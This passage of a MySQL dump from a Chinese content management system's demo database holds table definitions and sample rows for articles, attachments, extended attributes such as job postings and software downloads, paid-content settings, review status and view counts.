10:30:05',0,0,0,2,2,0,0,0,0,1),(69,90,1,1,4,1,'2016-09-26 16:37:28',0,1,1,2,16,0,1,0,0,1),(71,91,1,1,4,1,'2016-09-27 09:47:27',0,1,1,2,1,0,0,0,0,1),(72,90,1,2,4,1,'2016-09-27 10:18:46',0,1,1,2,4,0,0,0,0,1),(100,93,1,2,4,1,'2016-10-10 11:09:06',0,1,1,2,1,0,0,0,0,1),(101,91,1,2,4,1,'2016-10-10 11:16:31',0,1,1,2,1,0,0,0,0,1),(102,90,1,1,4,1,'2016-10-10 11:19:18',0,1,1,2,16,0,39,0,0,1),(103,90,1,1,4,1,'2016-10-10 11:21:37',0,1,1,2,1,0,0,0,0,1),(104,93,1,1,4,1,'2016-10-10 11:27:17',0,1,1,2,1,0,0,0,0,1),(105,91,1,1,4,1,'2016-10-10 11:28:52',0,1,1,2,1,0,0,0,0,1),(106,91,1,1,4,1,'2016-10-10 11:30:54',0,1,1,2,1,0,0,0,0,1),(107,91,1,1,4,1,'2016-10-10 11:32:35',0,1,1,2,1,0,0,0,0,1),(108,91,1,1,4,1,'2016-10-10 11:34:05',0,1,1,2,1,0,0,0,0,1),(109,91,1,1,4,1,'2016-10-10 11:35:26',0,1,1,2,16,0,21,0,0,1),(110,91,1,1,4,1,'2016-10-10 11:36:32',0,1,1,2,4,0,1,0,0,1),(111,75,1,2,1,1,'2016-10-10 11:45:47',0,0,0,2,16,0,0,12,12,1),(112,75,1,2,1,1,'2016-10-10 11:48:08',0,0,0,2,17,0,0,16,18,1),(113,75,1,4,1,1,'2016-10-10 11:50:03',0,0,0,2,29,0,0,13,11,1),(114,76,1,2,5,1,'2016-10-10 13:11:12',0,0,1,2,18,0,0,0,0,1),(115,76,1,2,5,1,'2016-10-10 13:15:37',0,0,1,2,1,0,0,0,0,1),(116,76,1,2,5,1,'2016-10-10 13:19:22',0,0,1,2,1,0,0,0,0,1),(117,76,1,2,5,1,'2016-10-10 13:22:07',0,0,0,2,18,0,0,0,0,1),(118,76,1,2,5,1,'2016-10-10 13:23:50',0,0,0,2,1,0,0,0,0,1),(119,76,1,2,5,1,'2016-10-10 13:26:38',0,0,0,2,2,0,0,0,0,1),(120,76,1,2,5,1,'2016-10-10 13:35:17',0,0,0,2,1,0,0,0,0,1),(121,77,1,2,6,1,'2016-10-10 13:38:11',1,1,1,2,2,0,0,0,0,1),(122,77,1,2,6,1,'2016-10-10 13:40:05',0,1,1,2,1,0,0,0,0,1),(123,77,1,2,6,1,'2016-10-10 13:41:03',0,1,1,2,1,0,0,0,0,1),(124,77,1,2,6,1,'2016-10-10 13:42:48',0,0,0,2,2,0,0,0,0,1),(125,77,1,2,6,1,'2016-10-10 13:44:47',0,0,0,2,1,0,0,0,0,1),(126,77,1,2,6,1,'2016-10-10 13:46:01',0,0,0,2,2,0,0,0,0,1),(127,77,1,2,6,1,'2016-10-10 13:46:26',0,0,0,2,1,0,0,0,0,1),(128,77,1,2,6,1,'2016-10-10 13:46:52',0,0,0,2,1,0,0,0,0,1),(129,77,1,2,6,1,'2016-10-10 13:47:24',0,0,0,2,18,0,0,0,0,1),(130,75,1,1,1,1,'2016-10-10 13:51:07',1,0,0,2,22,1,0,12,12,1),(131,75,1,1,1,1,'2016-10-10 13:54:05',0,0,0,2,17,0,0,15,13,1),(132,75,1,1,1,1,'2016-10-10 13:55:46',0,0,0,2,7,2,0,1,1,1),(140,79,1,1,8,1,'2016-10-10 14:27:44',0,0,0,2,18,0,0,0,0,1),(141,76,1,2,5,1,'2016-10-11 09:44:23',0,0,0,0,2,0,0,0,0,1);
/*!40000 ALTER TABLE `jc_content` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_attachment`
--

DROP TABLE IF EXISTS `jc_content_attachment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_attachment` (
  `content_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL COMMENT '排列顺序',
  `attachment_path` varchar(255) NOT NULL COMMENT '附件路径',
  `attachment_name` varchar(100) NOT NULL COMMENT '附件名称',
  `filename` varchar(100) DEFAULT NULL COMMENT '文件名',
  `download_count` int(11) NOT NULL DEFAULT '0' COMMENT '下载次数',
  KEY `fk_jc_attachment_content` (`content_id`),
  CONSTRAINT `fk_jc_attachment_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容附件表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_attachment`
--

LOCK TABLES `jc_content_attachment` WRITE;
/*!40000 ALTER TABLE `jc_content_attachment` DISABLE KEYS */;
INSERT INTO `jc_content_attachment` VALUES (69,0,'/u/cms/www/201609/261635496465.zip','演示.zip',NULL,0),(71,0,'/u/cms/www/201609/271002022fag.zip','演示.zip',NULL,0),(72,0,'/u/cms/www/201609/27102743993k.zip','演示.zip',NULL,0),(100,0,'/u/cms/www/201610/10110756cg7o.zip','演示.zip',NULL,0),(101,0,'/u/cms/www/201610/10111518cqda.zip','演示.zip',NULL,0),(102,0,'/u/cms/www/201610/10111758q1kj.zip','演示.zip',NULL,0),(103,0,'/u/cms/www/201610/101120397iez.zip','演示.zip',NULL,0),(104,0,'/u/cms/www/201610/10112554wirt.zip','演示.zip',NULL,0),(105,0,'/u/cms/www/201610/10112814u17l.zip','演示.zip',NULL,0),(106,0,'/u/cms/www/201610/101130257966.zip','演示.zip',NULL,0),(107,0,'/u/cms/www/201610/101131571wkz.zip','演示.zip',NULL,0),(108,0,'/u/cms/www/201610/101133341nc3.zip','演示.zip',NULL,0),(109,0,'/u/cms/www/201610/10113459gvbx.zip','演示.zip',NULL,0),(110,0,'/u/cms/www/201610/101136270k36.zip','演示.zip',NULL,0);
/*!40000 ALTER TABLE `jc_content_attachment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_attr`
--

DROP TABLE IF EXISTS `jc_content_attr`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_attr` (
  `content_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_content` (`content_id`),
  CONSTRAINT `fk_jc_attr_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容扩展属性表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_attr`
--

LOCK TABLES `jc_content_attr` WRITE;
/*!40000 ALTER TABLE `jc_content_attr` DISABLE KEYS */;
INSERT INTO `jc_content_attr` VALUES (14,'pic1',''),(14,'pic2',''),(11,'pic1',''),(11,'pic2',''),(12,'pic1',''),(12,'pic2',''),(23,'pic1',''),(23,'pic2',''),(27,'pic1',''),(27,'pic2',''),(28,'pic1',''),(28,'pic2',''),(29,'pic1',''),(29,'pic2',''),(30,'pic1',''),(30,'pic2',''),(32,'pic1',''),(32,'pic2',''),(43,'education','专科'),(43,'nature','全职'),(43,'hasmanage','不要求'),(43,'deadline',''),(43,'experience','1-3年'),(43,'salary','5000-8000'),(43,'category','项目主管'),(43,'workplace','南昌'),(43,'nums','1-3人'),(44,'education','专科'),(44,'nature','全职'),(44,'hasmanage','不要求'),(44,'deadline',''),(44,'experience','1-3年'),(44,'salary','3000-5000'),(44,'category','项目主管'),(44,'workplace','上海'),(44,'nums','3-5人'),(45,'education','专科'),(45,'nature','全职'),(45,'hasmanage','不要求'),(45,'deadline',''),(45,'experience','1-3年'),(45,'salary','1500-2000'),(45,'category','项目主管'),(45,'workplace','北京'),(45,'nums','5-10人'),(46,'education','专科'),(46,'nature','全职'),(46,'hasmanage','要求'),(46,'deadline',''),(46,'experience','1-3年'),(46,'salary','面议'),(46,'category','项目主管'),(46,'workplace','广州'),(46,'nums','1-3人'),(47,'education','专科'),(47,'nature','全职'),(47,'hasmanage','不要求'),(47,'deadline',''),(47,'experience','1-3年'),(47,'salary','1500-2000'),(47,'category','项目主管'),(47,'workplace','重庆'),(47,'nums','1-3人'),(48,'education','专科'),(48,'nature','全职'),(48,'hasmanage','不要求'),(48,'deadline',''),(48,'experience','1-3年'),(48,'salary','5000-8000'),(48,'category','项目主管'),(48,'workplace','杭州'),(48,'nums','1-3人'),(49,'education','专科'),(49,'nature','兼职'),(49,'hasmanage','不要求'),(49,'deadline',''),(49,'experience','1-3年'),(49,'salary','1500-2000'),(49,'category','项目主管'),(49,'workplace','重庆'),(49,'nums','1-3人'),(50,'education','专科'),(50,'nature','全职'),(50,'hasmanage','不要求'),(50,'deadline',''),(50,'experience','1-3年'),(50,'salary','1500-2000'),(50,'category','项目主管'),(50,'workplace','南京'),(50,'nums','1-3人'),(51,'education','专科'),(51,'nature','全职'),(51,'hasmanage','不要求'),(51,'deadline',''),(51,'experience','1-3年'),(51,'salary','2000-3000'),(51,'category','项目主管'),(51,'workplace','西安'),(51,'nums','1-3人'),(53,'Starring',''),(53,'Video','正片'),(53,'Director',''),(55,'Starring',''),(55,'Video','正片'),(55,'Director',''),(57,'Starring',''),(57,'Video','正片'),(57,'Director',''),(59,'Starring',''),(59,'Video','正片'),(59,'Director',''),(61,'Starring',''),(61,'Video','正片'),(61,'Director',''),(63,'Starring',''),(63,'Video','正片'),(63,'Director',''),(69,'demoUrl','http://'),(69,'relatedLink','http://'),(69,'softType','国产软件'),(69,'warrant','免费版'),(69,'edition','8.3.18038.0'),(69,'system','WinXP/Win2003/Vista/Win7/Win8'),(69,'size','54.3M'),(69,'bit','32/64'),(71,'demoUrl','http://'),(71,'system','win8/win7/vista/win2003/winxp'),(71,'size','10.9 MB'),(71,'relatedLink','http://'),(71,'softType','国产软件'),(71,'edition','V5.2.7'),(71,'warrant','免费版'),(71,'bit','32位'),(72,'demoUrl','http://'),(72,'system','WinXP(SP2以上) / Vista / Win7 / Win8 / Win8.1'),(72,'size','112M'),(72,'relatedLink','http://'),(72,'softType','国产软件'),(72,'edition','360杀毒V5.0.0.7092'),(72,'warrant','免费版'),(72,'bit','32/64'),(100,'demoUrl','http://'),(100,'system','win8/win7/vista/win2003/winxp'),(100,'size','298.68 MB'),(100,'relatedLink','http://'),(100,'softType','国产软件'),(100,'edition','3.00.401'),(100,'warrant','免费版'),(100,'bit','32/64'),(101,'demoUrl','http://'),(101,'system','WinXP/Win2003/Vista/Win7/Win8/Win10'),(101,'size','40.4M'),(101,'relatedLink','http://'),(101,'softType','国产软件'),(101,'edition','9.0.16.408'),(101,'warrant','免费版'),(101,'bit','32/64'),(102,'demoUrl','http://'),(102,'system','Win2000 WinXP Win2003 Vista Win8 Win7 Win10'),(102,'size','1.29MB'),(102,'relatedLink','http://'),(102,'softType','国产软件'),(102,'edition','10.3.0.2009 官方正式版'),(102,'warrant','免费版'),(102,'bit','32/64'),(103,'demoUrl','http://'),(103,'system','WinXP/Win2003/Vista/Win7/Win8/Win10'),(103,'size','37.5M'),(103,'relatedLink','http://'),(103,'softType','国产软件'),(103,'edition','8.0.0.8381'),(103,'warrant','免费版'),(103,'bit','32/64'),(104,'demoUrl','http://'),(104,'system','WinXP/Win2003/Vista/Win7/Win8'),(104,'size','22.6M'),(104,'relatedLink','http://'),(104,'softType','国产软件'),(104,'edition','8.13.0.0'),(104,'warrant','免费版'),(104,'bit','32/64'),(105,'demoUrl','http://'),(105,'system','WinXP/Win2003/Vista/Win7/Win8'),(105,'size','61.4M'),(105,'relatedLink','http://'),(105,'softType','国产软件'),(105,'edition','2.0.0.1'),(105,'warrant','免费版'),(105,'bit','32/64'),(106,'demoUrl','http://'),(106,'system','WinXP/Win2003/Vista/Win7/Win8/Win10'),(106,'size','33.3M'),(106,'relatedLink','http://'),(106,'softType','国产软件'),(106,'edition','4.3.3.27'),(106,'warrant','免费版'),(106,'bit','32/64'),(107,'demoUrl','http://'),(107,'system','Win7/Win8/Win10'),(107,'size','46.5M'),(107,'relatedLink','http://'),(107,'softType','国产软件'),(107,'edition','53.0.2785.143'),(107,'warrant','免费版'),(107,'bit','32/64'),(108,'demoUrl','http://'),(108,'system','Win7/WinVista/WinXP/Win8兼容软件'),(108,'size','9.7M'),(108,'relatedLink','http://'),(108,'softType','国产软件'),(108,'edition','8.1'),(108,'warrant','免费版'),(108,'bit','32/64'),(109,'demoUrl','http://'),(109,'system','Win2000/WinXP/Win2003/Vista/Win7/Win8/Win10'),(109,'size','32.7M'),(109,'relatedLink','http://'),(109,'softType','国产软件'),(109,'edition','版本：3.7.0.0011'),(109,'warrant','免费版'),(109,'bit','32/64'),(110,'demoUrl','http://'),(110,'system','WinXP/Win2003/Vista/Win7/Win8/Win10'),(110,'size','32.5M'),(110,'relatedLink','http://'),(110,'softType','国产软件'),(110,'edition','9.15.1596.0'),(110,'warrant','免费版'),(110,'bit','32/64'),(114,'pic1',''),(114,'pic2',''),(114,'pic3',''),(13,'pic1',''),(13,'pic2',''),(13,'pic3',''),(7,'pic1',''),(7,'pic2',''),(7,'pic3',''),(115,'pic1',''),(115,'pic2',''),(115,'pic3',''),(121,'Starring',''),(121,'Video','正片'),(121,'Director',''),(122,'Starring',''),(122,'Video','正片'),(122,'Director',''),(123,'Starring',''),(123,'Video','正片'),(123,'Director',''),(124,'Starring',''),(124,'Video','正片'),(124,'Director',''),(125,'Starring',''),(125,'Video','正片'),(125,'Director',''),(126,'Starring',''),(126,'Video','正片'),(126,'Director',''),(127,'Starring',''),(127,'Video','正片'),(127,'Director',''),(128,'Starring',''),(128,'Video','正片'),(128,'Director',''),(129,'Starring',''),(129,'Video','正片'),(129,'Director',''),(140,'education','专科'),(140,'nature','全职'),(140,'hasmanage','不要求'),(140,'deadline',''),(140,'experience','1-3年'),(140,'salary','1500-2000'),(140,'category','项目主管'),(140,'workplace','重庆'),(140,'nums','1-3人');
/*!40000 ALTER TABLE `jc_content_attr` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_buy`
--

DROP TABLE IF EXISTS `jc_content_buy`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_buy` (
  `content_buy_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `order_number` varchar(50) NOT NULL DEFAULT '' COMMENT '订单号',
  `content_id` int(11) NOT NULL COMMENT '内容ID',
  `buy_user_id` int(11) DEFAULT NULL COMMENT '购买用户ID',
  `author_user_id` int(11) NOT NULL COMMENT '笔者ID',
  `charge_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '成交金额',
  `author_amount` double(11,4) NOT NULL DEFAULT '0.0000' COMMENT '笔者所得',
  `plat_amount` double(11,4) NOT NULL DEFAULT '0.0000' COMMENT '平台所得',
  `buy_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '成交时间',
  `has_paid_author` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否已经结算给作者(0未结算 1已经结算)',
  `order_num_weixin` varchar(255) DEFAULT NULL COMMENT '微信支付订单号',
  `order_num_alipay` varchar(100) DEFAULT NULL COMMENT '支付宝订单号',
  `charge_reward` tinyint(1) NOT NULL DEFAULT '1' COMMENT '模式 1收费 2打赏',
  PRIMARY KEY (`content_buy_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='收费文章购买记录';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_buy`
--

LOCK TABLES `jc_content_buy` WRITE;
/*!40000 ALTER TABLE `jc_content_buy` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_content_buy` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_channel`
--

DROP TABLE IF EXISTS `jc_content_channel`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_channel` (
  `channel_id` int(11) NOT NULL,
  `content_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`content_id`),
  KEY `fk_jc_channel_content` (`content_id`),
  CONSTRAINT `fk_jc_channel_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_content_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容栏目关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_channel`
--

LOCK TABLES `jc_content_channel` WRITE;
/*!40000 ALTER TABLE `jc_content_channel` DISABLE KEYS */;
INSERT INTO `jc_content_channel` VALUES (76,2),(76,7),(75,11),(75,12),(76,13),(75,14),(75,23),(75,27),(75,28),(75,29),(75,30),(75,32),(75,33),(75,36),(75,37),(75,39),(79,43),(79,44),(79,45),(79,46),(79,47),(79,48),(79,49),(79,50),(79,51),(77,53),(77,55),(77,57),(77,59),(77,61),(77,63),(90,69),(91,71),(90,72),(93,100),(91,101),(90,102),(90,103),(93,104),(91,105),(91,106),(91,107),(91,108),(91,109),(91,110),(75,111),(75,112),(75,113),(76,114),(76,115),(76,116),(76,117),(76,118),(76,119),(76,120),(77,121),(77,122),(77,123),(77,124),(77,125),(77,126),(77,127),(77,128),(77,129),(75,130),(75,131),(75,132),(79,140),(76,141);
/*!40000 ALTER TABLE `jc_content_channel` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_charge`
--

DROP TABLE IF EXISTS `jc_content_charge`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_charge` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `charge_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '收费金额',
  `total_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '已累计收费',
  `year_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '年金额',
  `month_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '月金额',
  `day_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '日金额',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '最后购买时间',
  `charge_reward` tinyint(1) NOT NULL DEFAULT '0' COMMENT '模式，1收费 2打赏',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='收费内容配置';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_charge`
--

LOCK TABLES `jc_content_charge` WRITE;
/*!40000 ALTER TABLE `jc_content_charge` DISABLE KEYS */;
INSERT INTO `jc_content_charge` VALUES (130,0.01,0.00,0.00,0.00,0.00,NULL,1);
/*!40000 ALTER TABLE `jc_content_charge` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_check`
--

DROP TABLE IF EXISTS `jc_content_check`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_check` (
  `content_id` int(11) NOT NULL,
  `check_step` tinyint(4) NOT NULL DEFAULT '0' COMMENT '审核步数',
  `check_opinion` varchar(255) DEFAULT NULL COMMENT '审核意见',
  `is_rejected` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否退回',
  `reviewer` int(11) DEFAULT NULL COMMENT '终审者',
  `check_date` datetime DEFAULT NULL COMMENT '终审时间',
  PRIMARY KEY (`content_id`),
  KEY `fk_jc_content_check_user` (`reviewer`),
  CONSTRAINT `fk_jc_check_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_content_check_user` FOREIGN KEY (`reviewer`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容审核信息表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_check`
--

LOCK TABLES `jc_content_check` WRITE;
/*!40000 ALTER TABLE `jc_content_check` DISABLE KEYS */;
INSERT INTO `jc_content_check` VALUES (2,3,NULL,0,NULL,NULL),(7,3,NULL,0,NULL,NULL),(11,-1,NULL,0,1,'2016-09-28 14:17:39'),(12,-1,NULL,0,1,'2016-09-28 14:17:39'),(13,3,NULL,0,NULL,NULL),(14,-1,NULL,0,1,'2016-09-28 14:17:39'),(23,-1,NULL,0,1,'2016-09-28 14:17:39'),(27,-1,NULL,0,1,'2016-09-28 14:17:38'),(28,-1,NULL,0,1,'2016-09-28 14:17:38'),(29,-1,NULL,0,1,'2016-09-28 14:17:38'),(30,-1,NULL,0,1,'2016-09-28 14:17:38'),(32,-1,NULL,0,1,'2016-09-28 14:17:37'),(33,-1,NULL,0,1,'2016-09-28 14:17:37'),(36,-1,NULL,0,1,'2016-09-28 14:17:37'),(37,-1,NULL,0,1,'2016-09-28 14:17:37'),(39,-1,NULL,0,1,'2016-09-28 14:17:37'),(43,3,NULL,0,NULL,NULL),(44,3,NULL,0,NULL,NULL),(45,3,NULL,0,NULL,NULL),(46,3,NULL,0,NULL,NULL),(47,3,NULL,0,NULL,NULL),(48,3,NULL,0,NULL,NULL),(49,3,NULL,0,NULL,NULL),(50,3,NULL,0,NULL,NULL),(51,3,NULL,0,NULL,NULL),(53,3,NULL,0,NULL,NULL),(55,3,NULL,0,NULL,NULL),(57,3,NULL,0,NULL,NULL),(59,3,NULL,0,NULL,NULL),(61,3,NULL,0,NULL,NULL),(63,3,NULL,0,NULL,NULL),(69,3,NULL,0,NULL,NULL),(71,3,NULL,0,NULL,NULL),(72,3,NULL,0,NULL,NULL),(100,3,NULL,0,NULL,NULL),(101,3,NULL,0,NULL,NULL),(102,3,NULL,0,NULL,NULL),(103,3,NULL,0,NULL,NULL),(104,3,NULL,0,NULL,NULL),(105,3,NULL,0,NULL,NULL),(106,3,NULL,0,NULL,NULL),(107,3,NULL,0,NULL,NULL),(108,3,NULL,0,NULL,NULL),(109,3,NULL,0,NULL,NULL),(110,3,NULL,0,NULL,NULL),(111,3,NULL,0,NULL,NULL),(112,3,NULL,0,NULL,NULL),(113,3,NULL,0,NULL,NULL),(114,3,NULL,0,NULL,NULL),(115,3,NULL,0,NULL,NULL),(116,3,NULL,0,NULL,NULL),(117,3,NULL,0,NULL,NULL),(118,3,NULL,0,NULL,NULL),(119,3,NULL,0,NULL,NULL),(120,3,NULL,0,NULL,NULL),(121,3,NULL,0,NULL,NULL),(122,3,NULL,0,NULL,NULL),(123,3,NULL,0,NULL,NULL),(124,3,NULL,0,NULL,NULL),(125,3,NULL,0,NULL,NULL),(126,3,NULL,0,NULL,NULL),(127,3,NULL,0,NULL,NULL),(128,3,NULL,0,NULL,NULL),(129,3,NULL,0,NULL,NULL),(130,3,NULL,0,NULL,NULL),(131,3,NULL,0,NULL,NULL),(132,3,NULL,0,NULL,NULL),(140,3,NULL,0,NULL,NULL),(141,3,NULL,0,NULL,NULL);
/*!40000 ALTER TABLE `jc_content_check` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_count`
--

DROP TABLE IF EXISTS `jc_content_count`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_count` (
  `content_id` int(11) NOT NULL,
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '总访问数',
  `views_month` int(11) NOT NULL DEFAULT '0' COMMENT '月访问数',
  `views_week` int(11) NOT NULL DEFAULT '0' COMMENT '周访问数',
  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `comments` int(11) NOT NULL DEFAULT '0' COMMENT '总评论数',
  `comments_month` int(11) NOT NULL DEFAULT '0' COMMENT '月评论数',
  `comments_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周评论数',
  `comments_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日评论数',
  `downloads` int(11) NOT NULL DEFAULT '0' COMMENT '总下载数',
  `downloads_month` int(11) NOT NULL DEFAULT '0' COMMENT '月下载数',
  `downloads_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周下载数',
  `downloads_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日下载数',
  `ups` int(11) NOT NULL DEFAULT '0' COMMENT '总顶数',
  `ups_month` int(11) NOT NULL DEFAULT '0' COMMENT '月顶数',
  `ups_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周顶数',
  `ups_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日顶数',
  `downs` int(11) NOT NULL DEFAULT '0' COMMENT '总踩数',
  PRIMARY KEY (`content_id`),
  CONSTRAINT `fk_jc_count_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容计数表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_count`
--

LOCK TABLES `jc_content_count` WRITE;
/*!40000 ALTER TABLE `jc_content_count` DISABLE KEYS */;
INSERT INTO `jc_content_count` VALUES (2,14,13,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(7,38,33,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0),(11,21,20,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(12,10,10,1,1,0,0,0,0,0,0,0,0,1,1,0,0,0),(13,20,15,3,3,0,0,0,0,0,0,0,0,0,0,0,0,0),(14,58,44,21,21,0,0,0,0,0,0,0,0,14,14,14,14,0),(23,16,16,16,16,0,0,0,0,0,0,0,0,12,12,12,12,0),(27,9,9,1,1,0,0,0,0,0,0,0,0,2,2,2,2,0),(28,9,9,4,4,0,0,0,0,0,0,0,0,2,2,2,2,0),(29,3,3,1,1,0,0,0,0,0,0,0,0,1,1,1,1,0),(30,63,63,54,54,1,1,1,1,0,0,0,0,44,44,44,44,0),(32,5,5,2,2,0,0,0,0,0,0,0,0,2,2,1,1,1),(33,54,54,18,18,0,0,0,0,0,0,0,0,18,18,18,18,0),(36,4,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(37,12,12,2,2,0,0,0,0,0,0,0,0,2,2,1,1,0),(39,34,34,27,27,1,1,1,1,0,0,0,0,17,17,17,17,0),(43,3,3,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0),(44,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(45,19,19,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0),(46,19,19,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0),(47,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0),(48,3,3,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0),(49,18,18,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0),(50,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0),(51,17,17,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0),(53,3,3,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(57,4,4,4,4,0,0,0,0,0,0,0,0,0,0,0,0,0),(59,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0),(61,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(63,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0),(69,48,48,16,16,0,0,0,0,1,1,1,1,0,0,0,0,0),(71,5,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(72,6,6,4,4,0,0,0,0,0,0,0,0,0,0,0,0,0),(100,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(101,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(102,16,16,16,16,0,0,0,0,39,39,1,39,0,0,0,0,0),(103,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(104,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(105,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(106,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(107,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(108,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(109,16,16,16,16,0,0,0,0,21,21,1,21,0,0,0,0,0),(110,4,4,4,4,0,0,0,0,1,1,1,1,0,0,0,0,0),(111,16,16,16,16,0,0,0,0,0,0,0,0,12,12,12,12,0),(112,17,17,17,17,0,0,0,0,0,0,0,0,16,16,16,16,0),(113,29,29,29,29,0,0,0,0,0,0,0,0,13,13,13,13,0),(114,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0),(115,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(116,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(117,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0),(118,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(119,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0),(120,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(121,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0),(122,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(123,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(124,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0),(125,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(126,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0),(127,1,1,1,1,0,0,0,0,0